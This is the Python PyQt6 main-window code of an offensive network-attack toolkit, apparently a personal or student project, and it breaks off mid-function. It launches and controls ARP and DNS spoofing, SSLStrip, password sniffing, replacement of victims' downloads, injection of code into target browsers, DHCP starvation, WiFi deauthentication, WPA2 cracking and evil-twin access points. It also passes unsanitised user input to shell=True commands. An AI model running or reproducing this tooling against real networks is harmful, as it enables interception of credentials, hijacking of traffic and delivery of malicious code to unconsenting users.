# Form implementation generated from reading ui file 'report.ui'
#
# Created by: PyQt6 UI code generator 6.1.1
#
# WARNING: Any manual changes made to this file will be lost when pyuic6 is
# run again.  Do not edit this file unless you know what you are doing.

import shutil
from tkinter import W
from PyQt6 import QtCore, QtWidgets, uic
from src import network_scanner, arp_spoofer, mac_spoofer, fake_access_point, captive_portal
import os
import signal
import subprocess
import re
from prettytable import PrettyTable
import time
from datetime import datetime


class Ui_MainWindow(QtWidgets.QMainWindow):

    def __init__(self):
        super().__init__()
        uic.loadUi("new_gui.ui", self)

        self.configure_signals_slots()

        self.arp_spoof_status = 0
        self.dhcp_starvation_status = 0
        self.port_scan_status = 0
        self.sslstrip_status = 0
        self.dns_spoof_status = 0
        self.password_sniff_status = 0
        self.download_replace_status = 0
        self.code_inject_status = 0
        self.wireless_network_scan_status = 0
        self.handshake_snooper_status = 0
        self.wifi_dos_status = 0
        self.wpa2_cracker_status = 0
        self.evil_twin_status = 0

    # Override the closeEvent, check whether some attacks are stopped or not before closing the application
    def closeEvent(self, event):
        if self.sslstrip_status == 0:
            event.accept()
        else:
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Please stop the attacks before closing the application!")
            scanner_msg.setDetailedText("Check your SSLStrip attack")
            scanner_msg.exec()
            event.ignore()

    # Initialize threads and workers
    def initialize_threads_workers(self, thread, worker):
        worker.moveToThread(thread)
        thread.started.connect(worker.run)
        worker.finished.connect(thread.quit)
        worker.finished.connect(worker.deleteLater)
        thread.finished.connect(thread.deleteLater)
    
    # Check the existence of a network interface
    def check_interface(self, interface):
        try:
            result = subprocess.check_output(f"ifconfig {interface}", shell=True, stderr=subprocess.DEVNULL)
            return True
        except subprocess.CalledProcessError:
            return False
    
    # Check the existence of a wireless network interface
    def check_wireless_interface(self, interface):
        try:
            result = subprocess.check_output(f"iwconfig {interface}", shell=True, stderr=subprocess.DEVNULL)
            return True
        except subprocess.CalledProcessError:
            return False

    # Signals & Slots
    def configure_signals_slots(self):
        # Layer 2
        self.scan_count_dial.valueChanged.connect(self.scan_count_dial_changed)
        self.scan_pushButton.clicked.connect(self.scan_button_clicked)
        self.arp_spoof_button.clicked.connect(self.arp_spoof_button_clicked)
        self.mac_spoofer_get_button.clicked.connect(self.mac_spoofer_get_button_clicked)
        self.mac_spoofer_spoof_button.clicked.connect(self.mac_spoofer_spoof_button_clicked)
        self.dhcp_starvation_start_button.clicked.connect(self.dhcp_starvation_start_button_clicked)
        self.dhcp_starvation_clear_button.clicked.connect(self.dhcp_starvation_clear_button_clicked)
        # TCP/IP
        self.port_scanner_button.clicked.connect(self.port_scan_button_clicked)
        self.sslstrip_button.clicked.connect(self.sslstrip_button_clicked)
        # DNS Spoof
        self.dns_spoof_button.clicked.connect(self.dns_spoof_button_clicked)
        # HTTP
        self.password_sniff_button.clicked.connect(self.password_sniff_button_clicked)
        self.password_sniff_clear_button.clicked.connect(self.password_sniff_clear_button_clicked)
        self.download_replace_button.clicked.connect(self.download_replace_button_clicked)
        self.code_inject_button.clicked.connect(self.code_inject_button_clicked)
        self.crawler_start_button.clicked.connect(self.crawler_start_button_clicked)
        self.crawler_clear_button.clicked.connect(self.crawler_clear_button_clicked)
        # WiFi
        self.wireless_network_scan_button.clicked.connect(self.wireless_network_scan_button_clicked)
        self.handshake_snooper_button.clicked.connect(self.handshake_snooper_button_clicked)
        self.wifi_dos_button.clicked.connect(self.wifi_dos_button_clicked)
        self.wpa2_cracker_button.clicked.connect(self.wpa2_cracker_button_clicked)
        self.evil_twin_button.clicked.connect(self.evil_twin_button_clicked)
        self.evil_twin_clear_log.clicked.connect(self.evil_twin_clear_log_clicked)
        # Settings
        self.settings_wireless_monitor_button.clicked.connect(self.wireless_monitor_button_clicked)
        self.settings_wireless_managed_button.clicked.connect(self.wireless_managed_button_clicked)
        self.settings_network_manager_start.clicked.connect(self.network_manager_start_clicked)
        self.settings_network_manager_stop.clicked.connect(self.network_manager_stop_clicked)

    # Network scanner scan count dial value changed
    def scan_count_dial_changed(self):
        value = self.scan_count_dial.value()
        self.scan_count_label.setText("Scan Count: " + str(value))

    # Network scanner scan button clicked
    def scan_button_clicked(self):
        ip_address_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}\/\d{1,2}$')
        if not ip_address_pattern.search(self.ip_address_lineEdit.text()):
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Please enter the correct IP Address Range!")
            scanner_msg.setDetailedText("The examples are as follow:\n192.168.0.0/24\n192.168.140.0/24")
            scanner_msg.exec()
        elif not self.scanner_interface_lineEdit.text():
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Please enter your network interface!")
            scanner_msg.setDetailedText("You can type $ifconfig in your terminal to view your network interfaces")
            scanner_msg.exec()
        elif not self.check_interface(self.scanner_interface_lineEdit.text().replace(" ", "")):
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Interface Device Not Found!")
            scanner_msg.exec()
        else:
            # Get user input
            ip_address_range = self.ip_address_lineEdit.text()
            interface = self.scanner_interface_lineEdit.text().replace(" ", "")
            scan_count = self.scan_count_dial.value()
            # Update GUI
            self.scan_pushButton.setEnabled(False)
            self.textBrowser.clear()

            # Initialize thread and worker
            self.thread = QtCore.QThread()
            self.worker = ScanWorker(ip_address_range, interface, scan_count)
            self.initialize_threads_workers(self.thread, self.worker)
            # Update scan progress and scan results
            self.worker.progress.connect(self.report_scan_progress)
            self.worker.finished.connect(self.show_scan_results)
            self.thread.start()

    # Network scanner update progress bar
    def report_scan_progress(self, val):
        self.scan_progressBar.setValue(val)

    # Network scanner show scan results
    def show_scan_results(self, results):
        # Append scan result to textBrowser
        scan_results_table = PrettyTable(["IP", "MAC Address", "Vendor"])
        for result in results:
            ip_address = result["ip"]
            mac_address = result["mac"]
            vendor = result["ven"]
            scan_results_table.add_row([ip_address, mac_address, vendor])
        self.textBrowser.append(str(scan_results_table))

        self.scan_pushButton.setEnabled(True)

    # ARP spoofer button clicked
    def arp_spoof_button_clicked(self):
        # If ARP spoofer is not running
        if self.arp_spoof_status == 0:
            # Get user input
            target = self.arp_spoof_target.text()
            victims = self.arp_spoof_victim.toPlainText().replace(" ", "")
            victims_list = victims.split(",")
            # Update GUI
            self.arp_spoof_button.setText("Stop")
            self.arp_spoof_status = 1
            self.arp_spoof_log.clear()

            # Initialize thread and worker
            self.thread1 = QtCore.QThread()
            self.worker1 = ARPSpoofWorker(target, victims_list)
            self.initialize_threads_workers(self.thread1, self.worker1)
            # Update spoof progress and result
            self.worker1.progress.connect(self.report_arp_spoof_progress)
            self.worker1.finished.connect(self.report_arp_spoof_log)
            self.thread1.start()
        # If ARP spoofer is running
        elif self.arp_spoof_status == 1:
            self.worker1.progress.emit("\n[+] Stopping ARP Spoofer")
            self.worker1.stop.emit()
            # Update GUI
            self.arp_spoof_button.setEnabled(False)
            self.arp_spoof_button.setText("Spoof")
            self.arp_spoof_status = 0

    # ARP spoofer update progress
    def report_arp_spoof_progress(self, progress_text):
        self.arp_spoof_log.append(progress_text)

    # ARP spoofer show spoof result
    def report_arp_spoof_log(self):
        self.arp_spoof_log.append("[+] ARP Spoofer is stopped")
        self.arp_spoof_button.setEnabled(True)

    def mac_spoofer_get_button_clicked(self):
        if not self.mac_spoofer_interface.text():
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Please enter your network interface!")
            scanner_msg.setDetailedText("You can type $ifconfig in your terminal to view your network interfaces")
            scanner_msg.exec()
        elif not self.check_interface(self.mac_spoofer_interface.text().replace(" ", "")):
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Interface Device Not Found!")
            scanner_msg.exec()
        else:
            # Get user input
            interface = self.mac_spoofer_interface.text().replace(" ", "")
            new_mac = None
            action = 1

            # Initialize thread and worker
            self.get_mac_thread = QtCore.QThread()
            self.get_mac_worker = MACSpoofWorker(interface, new_mac, action)
            self.initialize_threads_workers(self.get_mac_thread, self.get_mac_worker)
            # Update spoof progress and result
            self.get_mac_worker.progress.connect(self.report_get_mac_result)
            self.get_mac_thread.start()

    def report_get_mac_result(self, progress_text):
        self.mac_spoofer_log.append(progress_text)

    def mac_spoofer_spoof_button_clicked(self):
        if not self.mac_spoofer_interface.text():
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Please enter your network interface!")
            scanner_msg.setDetailedText("You can type $ifconfig in your terminal to view your network interfaces")
            scanner_msg.exec()
        elif not self.check_interface(self.mac_spoofer_interface.text().replace(" ", "")):
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Interface Device Not Found!")
            scanner_msg.exec()
        else:
            # Get user input
            interface = self.mac_spoofer_interface.text().replace(" ", "")
            new_mac = self.mac_spoofer_mac_address.text().replace("-", ":").replace(" ", "")
            action = 2
            self.mac_spoofer_spoof_button.setEnabled(False)

            # Initialize thread and worker
            self.spoof_mac_thread = QtCore.QThread()
            self.spoof_mac_worker = MACSpoofWorker(interface, new_mac, action)
            self.initialize_threads_workers(self.spoof_mac_thread, self.spoof_mac_worker)
            # Update spoof progress and result
            self.spoof_mac_worker.progress.connect(self.report_spoof_mac_result)
            self.spoof_mac_thread.start()

    def report_spoof_mac_result(self, progress_text):
        self.mac_spoofer_log.append(progress_text)
        self.mac_spoofer_spoof_button.setEnabled(True)

    def dhcp_starvation_start_button_clicked(self):
        if self.dhcp_starvation_status == 0 and not self.dhcp_starvation_interface.text():
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Please enter your network interface!")
            scanner_msg.setDetailedText("You can type $ifconfig in your terminal to view your network interfaces")
            scanner_msg.exec()
        elif self.dhcp_starvation_status == 0 and not self.check_interface(self.dhcp_starvation_interface.text().replace(" ", "")):
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Interface Device Not Found!")
            scanner_msg.exec()

        # If DHCP Starvation Attack is not running
        elif self.dhcp_starvation_status == 0:
            # Get user input
            interface = self.dhcp_starvation_interface.text().replace(" ", "")
            # Update GUI
            self.dhcp_starvation_start_button.setText("Stop")
            self.dhcp_starvation_status = 1

            # Initialize thread and worker
            self.dhcp_starvation_thread = QtCore.QThread()
            self.dhcp_starvation_worker = DHCPStarvationWorker(interface)
            self.initialize_threads_workers(self.dhcp_starvation_thread, self.dhcp_starvation_worker)
            # Update progress and result
            self.dhcp_starvation_worker.progress.connect(self.report_dhcp_starvation_progress)
            self.dhcp_starvation_worker.finished.connect(self.report_dhcp_starvation_log)
            self.dhcp_starvation_thread.start()
        # If DHCP Starvation Attack is running
        elif self.dhcp_starvation_status == 1:
            self.dhcp_starvation_start_button.setEnabled(False)
            self.dhcp_starvation_start_button.setText("Start")
            self.dhcp_starvation_worker.stop.emit()
            self.dhcp_starvation_status = 0

    # DHCP Starvation update progress
    def report_dhcp_starvation_progress(self, progress_text):
        self.dhcp_starvation_log.append(progress_text)

    # DHCP Starvation show spoof result
    def report_dhcp_starvation_log(self):
        self.dhcp_starvation_log.append("\n[+] DHCP Starvation is stopped")
        self.dhcp_starvation_start_button.setEnabled(True)

    def dhcp_starvation_clear_button_clicked(self):
        self.dhcp_starvation_log.clear()

    def dns_spoof_button_clicked(self):
        if self.dns_spoof_status == 0 and not self.dns_spoof_domains.toPlainText():
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Please enter the target Domain and Spoofed Domain!")
            scanner_msg.exec()

        # If DNS spoofer is not running
        elif self.dns_spoof_status == 0:
            # Check if other netfilterqueue programs are running or not
            if self.download_replace_status == 1 or self.code_inject_status == 1:
                self.netfilterqueue_attack_worker.stop.emit()
                self.netfilterqueue_attack_thread.wait()

            # Update GUI
            self.dns_spoof_button.setText("Stop")
            self.dns_spoof_status = 1
            self.dns_spoof_domains.setEnabled(False)
            current_time = datetime.now().strftime("%H:%M:%S")
            self.dns_spoof_log.append(f"[+] {current_time}: DNS Spoofer is started")
            # Get user input
            domains = self.dns_spoof_domains.toPlainText().replace(" ", "").replace("\n", "~")
            file_location = None
            injection_code = None
            if self.download_replace_status == 1:
                file_location = self.download_replace_file_location.text().replace(" ", "")
            if self.code_inject_status == 1:
                injection_code = injection_code = self.code_inject_injection_code.text().replace('"', "'")

            # Initialize thread and worker
            self.netfilterqueue_attack_thread = QtCore.QThread()
            self.netfilterqueue_attack_worker = NetfilterqueueAttackWorker(domains, file_location, injection_code,
                                                                           self.sslstrip_status)
            self.initialize_threads_workers(self.netfilterqueue_attack_thread, self.netfilterqueue_attack_worker)
            self.netfilterqueue_attack_thread.start()
        # If DNS spoofer is running
        elif self.dns_spoof_status == 1:
            # Update GUI
            self.dns_spoof_button.setEnabled(False)
            self.dns_spoof_button.setText("Spoof")
            self.dns_spoof_status = 0
            current_time = datetime.now().strftime("%H:%M:%S")
            self.dns_spoof_log.append(f"[+] {current_time}: DNS Spoofer is stopped")
            # Stop netfilterqueue attacker
            self.netfilterqueue_attack_worker.stop.emit()
            self.netfilterqueue_attack_thread.wait()

            # Get user input
            domains = None
            file_location = None
            injection_code = None
            # If other netfilterqueue programs still running
            if self.download_replace_status == 1 or self.code_inject_status == 1:
                if self.download_replace_status == 1:
                    file_location = self.download_replace_file_location.text().replace(" ", "")
                if self.code_inject_status == 1:
                    injection_code = injection_code = self.code_inject_injection_code.text().replace('"', "'")
                self.netfilterqueue_attack_thread = QtCore.QThread()
                self.netfilterqueue_attack_worker = NetfilterqueueAttackWorker(domains, file_location, injection_code,
                                                                               self.sslstrip_status)
                self.initialize_threads_workers(self.netfilterqueue_attack_thread, self.netfilterqueue_attack_worker)
                self.netfilterqueue_attack_thread.start()
            # Flush iptables if all netfilterqueue programs are not running
            else:
                subprocess.Popen("iptables --flush", shell=True)
            # Update GUI
            self.dns_spoof_button.setEnabled(True)
            self.dns_spoof_domains.setEnabled(True)

    def password_sniff_button_clicked(self):
        if self.password_sniff_status == 0 and not self.password_sniffer_interface.text():
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Please enter your network interface!")
            scanner_msg.setDetailedText("You can type $ifconfig in your terminal to view your network interfaces")
            scanner_msg.exec()
        elif self.password_sniff_status == 0 and not self.check_interface(self.password_sniffer_interface.text().replace(" ", "")):
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Interface Device Not Found!")
            scanner_msg.exec()

        # If Download sniffer is not running
        elif self.password_sniff_status == 0:
            # Get user input
            interface = self.password_sniffer_interface.text().replace(" ", "")
            # Update GUI
            self.password_sniff_button.setText("Stop")
            self.password_sniff_status = 1

            # Initialize thread and worker
            self.thread3 = QtCore.QThread()
            self.worker3 = PasswordSniffWorker(interface)
            self.initialize_threads_workers(self.thread3, self.worker3)
            # Update progress and result
            self.worker3.progress.connect(self.report_password_sniff_progress)
            self.worker3.finished.connect(self.report_password_sniff_log)
            self.thread3.start()
        # If Password Sniffer is running
        elif self.password_sniff_status == 1:
            self.password_sniff_button.setEnabled(False)
            self.password_sniff_button.setText("Sniff")
            try:
                self.worker3.stop.emit()
            except RuntimeError:
                self.password_sniff_button.setEnabled(True)
            self.password_sniff_status = 0

    # Password sniffer update progress
    def report_password_sniff_progress(self, progress_text):
        self.password_sniff_log.append(progress_text)

    # Password sniffer show spoof result
    def report_password_sniff_log(self):
        self.password_sniff_log.append("[+] Password sniffer is stopped\n")
        self.password_sniff_button.setEnabled(True)

    def password_sniff_clear_button_clicked(self):
        self.password_sniff_log.clear()

    def download_replace_button_clicked(self):
        if self.download_replace_status == 0 and not self.download_replace_file_location.text():
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Please enter the file location to replace the original file!")
            scanner_msg.exec()

        # If Download replacer is not running
        elif self.download_replace_status == 0:
            # Check if other netfilterqueue programs are running or not
            if self.dns_spoof_status == 1 or self.code_inject_status == 1:
                self.netfilterqueue_attack_worker.stop.emit()
                self.netfilterqueue_attack_thread.wait()

            # Update GUI
            self.download_replace_button.setText("Stop")
            self.download_replace_status = 1
            self.download_replace_file_location.setEnabled(False)
            current_time = datetime.now().strftime("%H:%M:%S")
            self.download_replace_log.append(f"[+] {current_time}: Download Replacer is started")
            # Get user input
            file_location = self.download_replace_file_location.text().replace(" ", "")
            domains = None
            injection_code = None
            if self.dns_spoof_status == 1:
                domains = self.dns_spoof_domains.toPlainText().replace(" ", "").replace("\n", "~")
            if self.code_inject_status == 1:
                injection_code = injection_code = self.code_inject_injection_code.text().replace('"', "'")

            # Initialize thread and worker
            self.netfilterqueue_attack_thread = QtCore.QThread()
            self.netfilterqueue_attack_worker = NetfilterqueueAttackWorker(domains, file_location, injection_code,
                                                                           self.sslstrip_status)
            self.initialize_threads_workers(self.netfilterqueue_attack_thread, self.netfilterqueue_attack_worker)
            self.netfilterqueue_attack_thread.start()
        # If Download replacer is running
        elif self.download_replace_status == 1:
            # Update GUI
            self.download_replace_button.setEnabled(False)
            self.download_replace_button.setText("Start")
            self.download_replace_status = 0
            current_time = datetime.now().strftime("%H:%M:%S")
            self.download_replace_log.append(f"[+] {current_time}: Download Replacer is stopped")
            # Stop netfilterqueue attacker
            self.netfilterqueue_attack_worker.stop.emit()
            self.netfilterqueue_attack_thread.wait()

            # Get user input
            domains = None
            file_location = None
            injection_code = None
            # If other netfilterqueue programs still running
            if self.dns_spoof_status == 1 or self.code_inject_status == 1:
                if self.dns_spoof_status == 1:
                    domains = self.dns_spoof_domains.toPlainText().replace(" ", "").replace("\n", "~")
                if self.code_inject_status == 1:
                    injection_code = injection_code = self.code_inject_injection_code.text().replace('"', "'")
                self.netfilterqueue_attack_thread = QtCore.QThread()
                self.netfilterqueue_attack_worker = NetfilterqueueAttackWorker(domains, file_location, injection_code,
                                                                               self.sslstrip_status)
                self.initialize_threads_workers(self.netfilterqueue_attack_thread, self.netfilterqueue_attack_worker)
                self.netfilterqueue_attack_thread.start()
            # Flush iptables if all netfilterqueue programs are not running
            else:
                subprocess.Popen("iptables --flush", shell=True)
            # Update GUI
            self.download_replace_button.setEnabled(True)
            self.download_replace_file_location.setEnabled(True)

    def code_inject_button_clicked(self):
        if self.code_inject_status == 0 and not self.code_inject_injection_code.text():
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Please enter the code to be injected into the target browser!")
            scanner_msg.exec()

        # If Code injector is not running
        elif self.code_inject_status == 0:
            # Check if other netfilterqueue programs are running or not
            if self.dns_spoof_status == 1 or self.download_replace_status == 1:
                self.netfilterqueue_attack_worker.stop.emit()
                self.netfilterqueue_attack_thread.wait()

            # Update GUI
            self.code_inject_button.setText("Stop")
            self.code_inject_status = 1
            self.code_inject_injection_code.setEnabled(False)
            current_time = datetime.now().strftime("%H:%M:%S")
            self.code_inject_log.append(f"[+] {current_time}: Code Injector is started")
            # Get user input
            injection_code = self.code_inject_injection_code.text().replace('"', "'")
            domains = None
            file_location = None
            if self.dns_spoof_status == 1:
                domains = self.dns_spoof_domains.toPlainText().replace(" ", "").replace("\n", "~")
            if self.download_replace_status == 1:
                file_location = self.download_replace_file_location.text().replace(" ", "")

            # Initialize thread and worker
            self.netfilterqueue_attack_thread = QtCore.QThread()
            self.netfilterqueue_attack_worker = NetfilterqueueAttackWorker(domains, file_location, injection_code,
                                                                           self.sslstrip_status)
            self.initialize_threads_workers(self.netfilterqueue_attack_thread, self.netfilterqueue_attack_worker)
            self.netfilterqueue_attack_thread.start()
        # If Code injector is running
        elif self.code_inject_status == 1:
            # Update GUI
            self.code_inject_button.setEnabled(False)
            self.code_inject_button.setText("Start")
            self.code_inject_status = 0
            current_time = datetime.now().strftime("%H:%M:%S")
            self.code_inject_log.append(f"[+] {current_time}: Code injector is stopped")
            # Stop netfilterqueue attacker
            self.netfilterqueue_attack_worker.stop.emit()
            self.netfilterqueue_attack_thread.wait()

            # Get user input
            domains = None
            file_location = None
            injection_code = None
            # If other netfilterqueue programs still running
            if self.dns_spoof_status == 1 or self.download_replace_status == 1:
                if self.dns_spoof_status == 1:
                    domains = self.dns_spoof_domains.toPlainText().replace(" ", "").replace("\n", "~")
                if self.download_replace_status == 1:
                    file_location = self.download_replace_file_location.text().replace(" ", "")
                self.netfilterqueue_attack_thread = QtCore.QThread()
                self.netfilterqueue_attack_worker = NetfilterqueueAttackWorker(domains, file_location, injection_code,
                                                                               self.sslstrip_status)
                self.initialize_threads_workers(self.netfilterqueue_attack_thread, self.netfilterqueue_attack_worker)
                self.netfilterqueue_attack_thread.start()
            # Flush iptables if all netfilterqueue programs are not running
            else:
                subprocess.Popen("iptables --flush", shell=True)
            # Update GUI
            self.code_inject_button.setEnabled(True)
            self.code_inject_injection_code.setEnabled(True)

    def port_scan_button_clicked(self):
        if self.port_scan_status == 0 and not self.port_scanner_ip_address.text():
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Please enter the target IP address!")
            scanner_msg.exec()

        elif self.port_scan_status == 0:
            # Get user input
            ip_address = self.port_scanner_ip_address.text().replace(" ", "")
            scan_type = self.port_scanner_scan_type.currentText()
            # Update GUI
            self.port_scanner_log.clear()
            self.port_scanner_button.setText("Stop")
            self.port_scan_status = 1

            # Initialize thread and worker
            self.port_scan_thread = QtCore.QThread()
            self.port_scan_worker = PortScanWorker(ip_address, scan_type)
            self.initialize_threads_workers(self.port_scan_thread, self.port_scan_worker)
            self.port_scan_worker.progress.connect(self.report_port_scan_progress)
            self.port_scan_worker.finished.connect(self.report_port_scan_log)
            self.port_scan_thread.start()

        elif self.port_scan_status == 1:
            self.port_scanner_button.setEnabled(False)
            self.port_scan_worker.stop.emit()

    def report_port_scan_progress(self, progress_text):
        self.port_scanner_log.append(progress_text)

    def report_port_scan_log(self):
        self.port_scan_status = 0
        self.port_scanner_button.setEnabled(True)
        self.port_scanner_button.setText("Scan")
        self.port_scanner_log.append("\n\n[+] Port scan is completed")

    def sslstrip_button_clicked(self):
        if self.dns_spoof_status == 1 or self.code_inject_status == 1 or self.download_replace_status == 1:
            self.sslstrip_log.append("[-] Please stop all Netfilterqueue Programs first!")
        elif self.sslstrip_status == 0 and not self.sslstrip_interface.text():
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Please enter your network interface!")
            scanner_msg.setDetailedText("You can type $ifconfig in your terminal to view your network interfaces")
            scanner_msg.exec()
        elif self.sslstrip_status == 0 and not self.check_interface(self.sslstrip_interface.text().replace(" ", "")):
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Interface Device Not Found!")
            scanner_msg.exec()

        elif self.sslstrip_status == 0:
            # Get user input
            interface = self.sslstrip_interface.text().replace(" ", "")
            # Update GUI
            self.sslstrip_button.setText("Stop")
            self.sslstrip_status = 1

            # Initialize thread and worker
            self.sslstrip_thread = QtCore.QThread()
            self.sslstrip_worker = SSLStripWorker(interface)
            self.initialize_threads_workers(self.sslstrip_thread, self.sslstrip_worker)
            self.sslstrip_worker.progress.connect(self.report_sslstrip_progress)
            self.sslstrip_worker.finished.connect(self.report_sslstrip_log)
            self.sslstrip_thread.start()

        elif self.sslstrip_status == 1:
            # If netfilterqueue programs are running
            if self.dns_spoof_status == 1 or self.code_inject_status == 1 or self.download_replace_status == 1:
                self.sslstrip_log.append("[-] Please stop all Netfilterqueue Programs first by using the stop button")
            else:
                self.sslstrip_button.setEnabled(False)
                self.sslstrip_worker.stop.emit()

    def report_sslstrip_progress(self, progress_text):
        self.sslstrip_log.append(progress_text)

    def report_sslstrip_log(self):
        self.sslstrip_status = 0
        self.sslstrip_button.setEnabled(True)
        self.sslstrip_button.setText("Start")

    def crawler_start_button_clicked(self):
        attack_mode = self.crawler_attack_mode.currentText()
        if not self.crawler_url.text():
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Please insert the target URL")
            scanner_msg.exec()
        if (attack_mode == "Subdomain Crawler" or attack_mode == "Directory Crawler") and not self.crawler_wordlist_path.text():
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Please insert the wordlist full path to be used")
            scanner_msg.exec()

        else:
            # Get user input
            url = self.crawler_url.text().replace(" ", "").replace("https://", "").replace("http://", "")
            slow_mode = "Disable"
            recursive_count = 0
            if self.crawler_slow_mode.isChecked():
                slow_mode = "Enable"
            if self.crawler_wordlist_path.text():
                wordlist_path = self.crawler_wordlist_path.text().replace(" ", "")
            if self.crawler_recursive_count.text():
                recursive_count = self.crawler_recursive_count.text().replace(" ", "")
            # Update GUI
            self.crawler_log.append(f"[+] Initialized {attack_mode}")

            # Initalize Crawler
            if attack_mode == "Subdomain Crawler":
                subprocess.Popen(
                    f'xterm -hold -T "Crawler" -geometry 80x25+0+0 -fa "Monospace" -fs 10 '
                    f'-sb -rightbar -e python3 src/crawler.py -m "{attack_mode}" -u {url} -w {wordlist_path} -s {slow_mode}',
                    shell=True)
            elif attack_mode == "Directory Crawler":
                subprocess.Popen(
                    f'xterm -hold -T "Crawler" -geometry 80x25+0+0 -fa "Monospace" -fs 10 '
                    f'-sb -rightbar -e python3 src/crawler.py -m "{attack_mode}" -u {url} -w {wordlist_path} -s {slow_mode}',
                    shell=True)
            elif attack_mode == "Link Crawler":
                subprocess.Popen(
                    f'xterm -hold -T "Crawler" -geometry 80x25+0+0 -fa "Monospace" -fs 10 '
                    f'-sb -rightbar -e python3 src/crawler.py -m "{attack_mode}" -u {url} -r {recursive_count}',
                    shell=True)
    def crawler_clear_button_clicked(self):
        self.crawler_log.clear()

    def wireless_network_scan_button_clicked(self):
        if self.wireless_network_scan_status == 0 and not self.wireless_network_scan_interface.text():
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Please enter your network interface!")
            scanner_msg.setDetailedText("You can type $ifconfig in your terminal to view your network interfaces")
            scanner_msg.exec()
        elif self.wireless_network_scan_status == 0 and not self.check_wireless_interface(self.wireless_network_scan_interface.text().replace(" ", "")):
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Interface Device Not Found!")
            scanner_msg.exec()
        
        elif self.wireless_network_scan_status == 0:
            # Get user input
            target_ap_bssid = ""
            if self.wireless_network_scan_target_ap_bssid.text().replace(" ", ""):
                target_ap_bssid = self.wireless_network_scan_target_ap_bssid.text().replace(" ", "")
            interface = self.wireless_network_scan_interface.text().replace(" ", "")
            band = "bg"
            if self.wireless_network_scan_5ghz.isChecked():
                band = "a"
            if self.wireless_network_scan_2ghz.isChecked():
                band += "bg"
            # Update GUI
            self.wireless_network_scan_button.setText("Stop")
            self.wireless_network_scan_status = 1

            # Initialize thread and worker
            self.wireless_network_scan_thread = QtCore.QThread()
            self.wireless_network_scan_worker = WirelessNetworkScanWorker(target_ap_bssid, interface, band)
            self.initialize_threads_workers(self.wireless_network_scan_thread, self.wireless_network_scan_worker)
            self.wireless_network_scan_worker.progress.connect(self.report_wireless_network_scan_progress)
            self.wireless_network_scan_worker.finished.connect(self.report_wireless_network_scan_log)
            self.wireless_network_scan_thread.start()

        elif self.wireless_network_scan_status == 1:
            self.wireless_network_scan_button.setEnabled(False)
            self.wireless_network_scan_worker.stop.emit()

    def report_wireless_network_scan_progress(self, progress_text):
        self.wireless_network_scan_log.append(progress_text)

    def report_wireless_network_scan_log(self):
        self.wireless_network_scan_status = 0
        self.wireless_network_scan_button.setEnabled(True)
        self.wireless_network_scan_button.setText("Start")

    def handshake_snooper_button_clicked(self):
        if self.handshake_snooper_status == 0 and not self.handshake_snooper_interface.text():
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Please enter your network interface!")
            scanner_msg.setDetailedText("You can type $ifconfig in your terminal to view your network interfaces")
            scanner_msg.exec()
        elif self.handshake_snooper_status == 0 and not self.check_wireless_interface(self.handshake_snooper_interface.text().replace(" ", "")):
            scanner_msg = QtWidgets.QMessageBox()
            scanner_msg.setWindowTitle("Error")
            scanner_msg.setText("Interface Device Not Found!")
            scanner_msg.exec()

        elif self.handshake_snooper_status == 0:
            # Get user input
            target_ap_bssid = self.handshake_snooper_target_ap_bssid.text().replace(" ", "")
            channel = self.handshake_snooper_channel.text().replace(" ", "")
            file_name = self.handshake_snooper_file_name.text()
            interface = self.handshake_snooper_interface.text().replace(" ", "")
            attack_mode = self.handshake_snooper_attack_mode.currentText()
            # Update GUI
            self.handshake_snooper_button.setText("Stop")
            self.handshake_snooper_status = 1
            self.handshake_snooper_log.clear()

            # Initialize thread and worker
            self.handshake_snooper_thread = QtCore.QThread()
            self.handshake_snooper_worker = HandshakeSnoopWorker(target_ap_bssid, channel, file_name, interface,
                                                                 attack_mode)
            self.initialize_threads_workers(self.handshake_snooper_thread, self.handshake_snooper_worker)
            self.handshake_snooper_worker.progress.connect(self.report_handshake_snooper_progress)
            self.handshake_snooper_worker.finished.connect(self.report_handshake_snooper_log)
            self.handshake_snooper_thread.start()

        elif self.handshake_snooper_status == 1:
            self.handshake_snooper_button.setEnabled(False)
            self.handshake_snooper_worker.stop.emit()

    def report_handshake_snooper_progress(self, progress_text):
